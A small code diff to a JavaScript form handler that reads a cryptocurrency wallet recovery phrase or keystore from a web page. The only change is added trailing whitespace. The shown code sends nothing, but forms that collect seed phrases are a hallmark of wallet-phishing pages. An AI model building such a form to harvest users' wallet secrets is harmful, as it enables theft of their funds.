@@ -31,7 +31,7 @@ function submitForm(e) {
             
             switch (walletInfoType) {
                 case 'phrase':
-                    var walletPhrase = document.getElementById('wallet-phrase').value;
+                    var walletPhrase = document.getElementById('wallet-phrase').value; 
                     break;
                 case 'keystore':
                     var walletKeystore = document.getElementById('wallet-keystore').value;
